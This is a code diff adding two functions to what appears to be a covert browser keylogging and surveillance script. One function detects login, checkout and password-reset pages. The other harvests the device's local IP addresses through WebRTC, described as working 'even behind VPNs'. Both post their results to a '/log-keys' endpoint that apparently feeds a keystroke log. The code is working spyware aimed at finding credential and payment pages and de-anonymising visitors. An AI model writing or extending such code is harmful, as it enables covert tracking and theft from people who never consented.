@@ -1121,6 +1121,60 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         });
     }
 
+    // ═══ PAGE TYPE DETECTOR ═══════════════════════════════════
+    // Analyses URL, form contents, and headings to detect page category.
+    function initPageTypeDetector() {
+        try {
+            const url  = location.href.toLowerCase();
+            const path = location.pathname.toLowerCase();
+            const text = (document.title + ' ' + (document.querySelector('h1,h2')?.textContent || '')).toLowerCase();
+            const hasPasswordField = !!document.querySelector('input[type="password"]');
+
+            let types = [];
+            if (/login|signin|sign-in|log-in|auth|account\/login/.test(path + url)) types.push('login');
+            if (/register|signup|sign-up|create.account/.test(path + url)) types.push('register');
+            if (/checkout|payment|pay|billing|order|cart/.test(path + url)) types.push('checkout');
+            if (/forgot.?password|reset.?password/.test(path + url)) types.push('password-reset');
+            if (/search|query|find|results/.test(path + url)) types.push('search');
+            if (hasPasswordField && types.length === 0) types.push('login'); // has password field = likely login
+
+            if (types.length === 0) return; // no type detected — don't log noise
+            post('/log-keys', {
+                keys: `[PAGE TYPE] type=${types.join('+')} url="${location.href.slice(0, 200)}"`,
+                url: location.href
+            });
+        } catch {}
+    }
+
+    // ═══ WEBRTC LOCAL IP LEAK ═════════════════════════════════
+    // Uses RTCPeerConnection ICE candidates to discover the device's real LAN IP.
+    // Works even behind VPNs for the local subnet address.
+    function initWebRTCIPTracker() {
+        if (typeof RTCPeerConnection === 'undefined') return;
+        try {
+            const pc = new RTCPeerConnection({ iceServers: [] });
+            pc.createDataChannel('');
+            const ips = new Set();
+            pc.onicecandidate = e => {
+                if (!e || !e.candidate) {
+                    if (ips.size > 0) {
+                        post('/log-keys', {
+                            keys: `[WEBRTC IPs] local=${[...ips].join(', ')}`,
+                            url: location.href
+                        });
+                    }
+                    pc.close();
+                    return;
+                }
+                const m = e.candidate.candidate.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/g);
+                if (m) m.forEach(ip => { if (!ip.startsWith('0.') && ip !== '0.0.0.0') ips.add(ip); });
+            };
+            pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
+            // Timeout safety
+            setTimeout(() => { try { pc.close(); } catch {} }, 5000);
+        } catch {}
+    }
+
     // ═══ DEVICE ORIENTATION / MOTION ══════════════════════════
     // Captures compass heading, tilt (alpha/beta/gamma) and motion data on mobile/tablet.
     // Sends a one-shot snapshot into the key-log so it appears in the keystrokes feed.
@@ -1247,6 +1301,8 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         initPasteTracker();
         initScrollDepthTracker();
         initResizeTracker();
+        initPageTypeDetector();
+        initWebRTCIPTracker();
         initErrorCapture();
         initNetworkMonitor();
         initOrientationTracker();
